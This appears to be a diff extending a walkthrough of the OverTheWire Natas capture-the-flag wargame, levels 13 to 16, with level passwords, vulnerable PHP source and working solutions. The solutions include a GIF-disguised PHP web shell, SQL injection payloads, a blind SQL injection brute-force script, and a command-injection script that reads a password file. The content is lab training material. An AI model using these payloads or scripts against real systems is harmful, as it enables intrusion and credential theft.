@@ -365,3 +365,227 @@ I change the tescipab3s.jpg to tescipab3s.php which seems to circumvent the issu
 ```
 natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
 ```
+The source code
+```php
+ <html>
+
+<? 
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";    
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+    
+    $err=$_FILES['uploadedfile']['error'];
+    if($err){
+        if($err === 2){
+            echo "The uploaded file exceeds MAX_FILE_SIZE";
+        } else{
+            echo "Something went wrong :/";
+        }
+    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+```
+Looking this code, the only thing that is checked is the file type. You can trick file uploaders by changing the magic bytes of a file. Creating a php script:
+```php
+GIF89a;
+<? system($_GET['cmd']); ?>
+```
+Should do the trick. Don't forget to change the extension in your proxy.
+
+## natas14
+```
+natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+```
+Da Source code
+```php
+
+<?
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas14', '<censored>');
+    mysql_select_db('natas14', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
+            echo "Successful login! The password for natas15 is <censored><br>";
+    } else {
+            echo "Access denied!<br>";
+    }
+    mysql_close($link);
+} else {
+?>
+```
+This webapp does a SQL query without doing any protection from injections. Using the classical payload:
+```sql
+" OR 1=1-- -
+```
+Gets you the password
+
+## nata15
+```
+natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+```
+Code
+```php
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas15', '<censored>');
+    mysql_select_db('natas15', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) > 0) {
+        echo "This user exists.<br>";
+    } else {
+        echo "This user doesn't exist.<br>";
+    }
+    } else {
+        echo "Error in query.<br>";
+    }
+
+    mysql_close($link);
+} else {
+?>
+
+```
+At first I thought this was a UNION based SQL injection because they gave you the name of the table and both rows. However, looking at the code there is no way for the results to be echoed out. Everything that is returned is hardcoded. If you put in a random user you'll get "This user doesn't exist" but if you input the classic SQL injection you get "This user exists". This is most likely a BLIND SQL injection where you can slowly reveal information using SQL wildcard.<br><br>
+So if you inject:
+```sql
+natas16" AND password LIKE BINARY "W%";-- -
+```
+I write a small Python script to automate this and get the password
+```python
+#!/usr/bin/env python3
+import requests
+import string
+import sys
+from requests.auth import HTTPBasicAuth
+
+url = "http://natas15.natas.labs.overthewire.org/index.php"
+auth = HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
+characters = string.ascii_letters + string.digits
+username = ""
+
+while True:
+    for c in characters:
+        payload = f'natas16" AND password LIKE BINARY "{username + c}%";-- -'
+        data = {"username":payload}
+        
+        print(f"Trying... {payload}")
+
+        r = requests.post(url,data=data,auth=auth)
+
+        if ("This user exists." in r.text):
+            username = username + c
+            break
+        elif (c == '9'):
+            print(f"Password: {username}")
+            sys.exit()
+```
+
+## natas16
+```
+natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+```
+The code:
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+
+```
+The injection here is pretty interesting. For starters the payload being used <b>$(grep -E ^a.* /etc/natas_webpass/natas17)needle</b>. If this command evaluates to true and returns an "a", then the payload will be <b>grep -i aneedle dictionary.txt</b> which does not exist in dictionary.txt. If however the payload evaluates to false, then the payload will be <b>grep -i needle dictionary.txt</b> which does exist in dictionary.txt. Essentially, <b>if the inner grep passes, the outer grep will not meaning we are a step closer to leaking the password.</b><br>
+My final script was this:
+```python
+#!/usr/bin/env python3
+
+#=== Modules ===
+import requests
+import string
+import sys
+from requests.auth import HTTPBasicAuth
+
+# === Authentication and characters for payload ===
+auth = HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
+characters = string.ascii_letters + string.digits
+needle = ""
+
+# === Driver loop ===
+while True:
+    for c in characters:
+        url = f"http://natas16.natas.labs.overthewire.org/index.php?needle=$(grep -E ^{needle + c}.* /etc/natas_webpass/natas17)hacker"
+        print(f"Trying... {url}")
+        r = requests.get(url,auth=auth)
+
+        # == Analyze request === 
+        if ('hacker' not in r.text):
+            needle += c 
+            break
+        elif (c == '9'):
+            print(f"natas17 Password: {needle}")
+            sys.exit()
+
+
+
+```
